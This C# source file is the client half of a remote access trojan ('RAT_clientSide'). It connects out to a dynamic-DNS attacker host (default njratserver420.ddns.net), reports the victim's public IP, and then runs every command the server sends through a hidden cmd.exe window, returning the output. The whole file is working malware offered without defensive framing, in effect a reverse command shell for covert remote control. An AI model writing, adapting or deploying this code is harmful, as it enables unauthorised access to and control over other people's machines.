using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Sockets;
using System.Net;

namespace RAT_clientSide
{
    class Program
    {
        //Get the HostName and Port
        private static string HostName = Microsoft.VisualBasic.Interaction.InputBox("Enter HostName:", "HostName", "njratserver420.ddns.net", 0, 0);
        private static int Port = Convert.ToInt32(Microsoft.VisualBasic.Interaction.InputBox("Enter Port:", "Port", "6258", 0, 0));
        private static string Cmd;


        static void Main(string[] args)
        {
            //Create the client and the streams
            TcpClient client = new TcpClient(HostName, Port);

            StreamReader sr = new StreamReader(client.GetStream());
            StreamWriter sw = new StreamWriter(client.GetStream());

            //Send the client ip
            try
            {
                //Get the ip and send it
                string myIp = new WebClient().DownloadString(@"http://icanhazip.com").Trim();
                logToFile(myIp);
                sw.WriteLine(myIp);
                sw.Flush();
            }
            catch (Exception e)
            {
                //logToFile(Convert.ToString(e));
                Console.WriteLine(e);
            }

            //Prepare cmd start object
            System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();
            cmdProcess.StartInfo.FileName = "cmd.exe";
            cmdProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            cmdProcess.StartInfo.CreateNoWindow = true;
            cmdProcess.StartInfo.UseShellExecute = false;
            cmdProcess.StartInfo.RedirectStandardOutput = true;

            //Loop that takes commands from the server and puts it in to the cmd
            while (true)
            {

                //Try to get the commands
                try
                {
                    Cmd = sr.ReadLine();
                    Console.WriteLine(Cmd);
                }
                catch (Exception e) { }

                //Insert the arguement and run the cmd
                cmdProcess.StartInfo.Arguments = "/C " + Cmd;
                cmdProcess.Start();

                string output = cmdProcess.StandardOutput.ReadToEnd();

                //Try to send the commands
                try
                {
                    sw.WriteLine(output);
                    sw.Flush();
                }
                catch (Exception e) { }
            }
        }

        private static void logToFile(string log)
        {
            //If the file dosen't exist, create it and log, otherwise just log it
            if (!File.Exists("log.txt"))
            {
                //Create the file
                File.Create("log.txt").Dispose();

                //Temp create a streamWriter
                using (StreamWriter sw = new StreamWriter("log.txt"))
                {
                    sw.WriteLine(log);
                    sw.Close();
                }
            }
            else
            {
                using (StreamWriter sw = new StreamWriter("log.txt"))
                {
                    sw.WriteLine(log);
                    sw.Close();
                }
            }

        }

    }
}
